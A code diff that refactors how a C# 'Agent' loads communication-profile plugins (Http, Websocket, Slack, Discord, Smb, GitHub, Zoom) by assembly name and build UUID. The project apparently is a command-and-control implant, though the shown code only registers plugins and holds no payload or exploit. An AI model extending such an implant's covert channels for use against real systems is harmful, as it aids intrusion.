@@ -1,4 +1,4 @@
-﻿using Autofac;
+using Autofac;
 using Agent.Interfaces;
 using Agent.Managers;
 using System.Reflection;
@@ -48,27 +48,29 @@ namespace Agent.Config
         }
         private static void TryLoadProfiles(Autofac.ContainerBuilder containerBuilder)
         {
-            List<string> potentialProfiles = new List<string> { "DebugProfile", "Http", "Websocket", "Slack", "Discord", "Smb", "GitHub", "Zoom" };
-
+            string[] potentialProfiles = ["DebugProfile", "Http", "Websocket", "Slack", "Discord", "Smb", "GitHub", "Zoom"];
             var buildAgentUuid = new AgentConfig().build_uuid;
+
             foreach (var profile in potentialProfiles)
             {
-                var logicalName = $"Agent.Profiles.{profile}";
-                foreach (var candidate in AssemblyIdentity.GetLoadCandidates(
-                    buildAgentUuid,
-                    logicalName))
+                TryRegisterProfile(containerBuilder, buildAgentUuid, $"Agent.Profiles.{profile}");
+            }
+        }
+
+        private static void TryRegisterProfile(Autofac.ContainerBuilder containerBuilder, string buildAgentUuid, string logicalName)
+        {
+            foreach (var candidate in AssemblyIdentity.GetLoadCandidates(buildAgentUuid, logicalName))
+            {
+                try
                 {
-                    try
-                    {
-                        var profileAssembly = Assembly.Load(
-                            $"{candidate}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
-                        containerBuilder.RegisterAssemblyTypes(profileAssembly)
-                            .As<IProfile>().SingleInstance();
-                        break;
-                    }
-                    catch
-                    {
-                    }
+                    var profileAssembly = Assembly.Load(
+                        $"{candidate}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+                    containerBuilder.RegisterAssemblyTypes(profileAssembly)
+                        .As<IProfile>().SingleInstance();
+                    return;
+                }
+                catch
+                {
                 }
             }
         }
